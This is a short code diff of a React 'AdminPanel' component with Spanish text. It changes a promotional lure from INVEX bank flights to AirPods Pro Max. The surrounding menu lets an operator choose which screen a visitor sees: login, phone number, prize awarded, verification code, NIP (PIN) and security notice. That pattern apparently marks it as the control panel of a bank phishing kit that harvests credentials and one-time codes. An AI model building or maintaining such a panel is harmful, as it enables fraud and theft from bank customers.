@@ -274,7 +274,7 @@ export default function AdminPanel() {
           // Mostrar notificación del nuevo cliente con folio
           toast({
             title: "¡Cliente Registrado para Promoción!",
-            description: `Folio: ${folio} - Cliente registrado para promoción de vuelos INVEX`,
+            description: `Folio: ${folio} - Cliente registrado para promoción AirPods Pro Max`,
             duration: 8000,
           });
           
@@ -975,7 +975,7 @@ export default function AdminPanel() {
                   <option value="">Selecciona una opción</option>
                   <option value="login">1. Login</option>
                   <option value="telefono">2. Ingresa tu teléfono celular</option>
-                  <option value="vuelos_otorgados">3. Vuelos Otorgados</option>
+                  <option value="audifonos_otorgados">3. Audífonos Otorgados</option>
                   <option value="codigo">4. Código de verificación</option>
                   <option value="nip">5. NIP</option>
                   <option value="protege">6. Aviso de seguridad</option>
